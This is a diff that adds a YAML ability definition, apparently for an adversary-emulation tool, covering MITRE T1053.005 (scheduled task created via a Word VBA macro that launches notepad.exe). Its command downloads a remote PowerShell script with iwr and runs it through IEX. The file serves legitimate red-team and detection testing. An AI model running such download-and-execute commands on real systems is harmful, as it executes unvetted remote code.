@@ -1,0 +1,20 @@
+- description: 'This module utilizes the Windows API to schedule a task for code execution
+    (notepad.exe). The task scheduler will execute "notepad.exe" within
+
+    30 - 40 seconds after this module has run
+
+    '
+  id: 764a8a247d9227de24402e5ec0b150c3
+  name: Task Scheduler via VBA
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          ; Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"
+          -officeProduct "Word" -sub "Scheduler"
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1053.005
+    name: 'Scheduled Task/Job: Scheduled Task'
